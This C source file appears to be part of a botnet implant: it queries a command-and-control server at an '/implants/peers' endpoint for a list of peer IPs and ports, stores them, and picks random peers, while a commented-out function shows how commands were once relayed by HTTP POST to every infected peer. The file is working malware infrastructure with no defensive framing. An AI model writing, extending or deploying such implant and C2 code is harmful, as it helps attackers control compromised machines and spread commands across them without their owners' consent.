#include "peer-list.h"
#include "peers.h"
#include "http-client.h"
#include "config.h"
#include <cjson/cJSON.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>


#define PEERS_ENDPOINT "/implants/peers"


PeerList global_pl;


int get_peer_list(PeerList *pl) {
    char url[265];
    snprintf(url, sizeof(url), "%s%s?port=%d", C2_URL, PEERS_ENDPOINT, WEBSERVER_PORT);

    char *resp = NULL;

    if(http_get(url, &resp) != 0) {
        fprintf(stderr, "Failed to fetch peer list from server\n");
        return -1;
    }

    cJSON *list = cJSON_Parse(resp);
    if(!list) {
        free(resp);
        return -1;
    }

    if (!cJSON_IsArray(list)) {
        cJSON_Delete(list);
        free(resp);
        return -1;
    }

    cJSON *peer = NULL;
    cJSON_ArrayForEach(peer, list) {
        if(!cJSON_IsObject(peer)) {
            continue;
        }

        cJSON *ip = cJSON_GetObjectItemCaseSensitive(peer, "ip");
        cJSON *port = cJSON_GetObjectItemCaseSensitive(peer, "port");

        if(!cJSON_IsString(ip) || !cJSON_IsNumber(port)) {
            continue;
        }

        pl_add(pl, ip->valuestring, port->valueint);
    }

    cJSON_Delete(list);
    free(resp);

    printf("🖥️ - Received %zu peers from C2\n", pl->len);
    return 0;
}


int init_global_peers(void) {
    pl_init(&global_pl);
    return get_peer_list(&global_pl);
}

Peer *get_random_peer(PeerList *pl) {
    if (pl == NULL || pl->len == 0) {
        return NULL;
    }
    size_t idx = rand() % pl->len;
    return &pl->peers[idx];
}



// flood functtion, this was part of my command transportation, after many rewrites i came to realize that the best way to transport a command is to not transport it at all.
// int flood_command(PeerList *pl, int id, const char *cmd) {
//     int sent = 0;
//     for(size_t i = 0; i < pl->len; i++) {
//         Peer *p = &pl->peers[i];


//         // marshalling of all the neccessary feilds
//         cJSON *root = cJSON_CreateObject();
//         cJSON_AddNumberToObject(root, "id", id);
//         cJSON_AddStringToObject(root, "cmd", cmd);

//         char *body = cJSON_PrintUnformatted(root);
//         cJSON_Delete(root);

//         char destination[256];
//         snprintf(destination, sizeof destination, "http://%s:%d/receive-command", p->ip, p->port);

//         // the real magic
//         char *resp = NULL;
//         int err = http_post(destination, body, &resp);
//         if(err) {
//             fprintf(stderr, "⚠️ - RELAY FAILED! Failed to flood command ID %d to %s:%d ERR CODE %d\n", id, p->ip, p->port, err);
//         } else {
//             sent++;
//         }

//         free(resp);
//         free(body);
//     }

//     // printf("📨 - Flooding completed, sent to %zu peers\n", sent);
//     return sent > 0 ? 1 : -1;
// }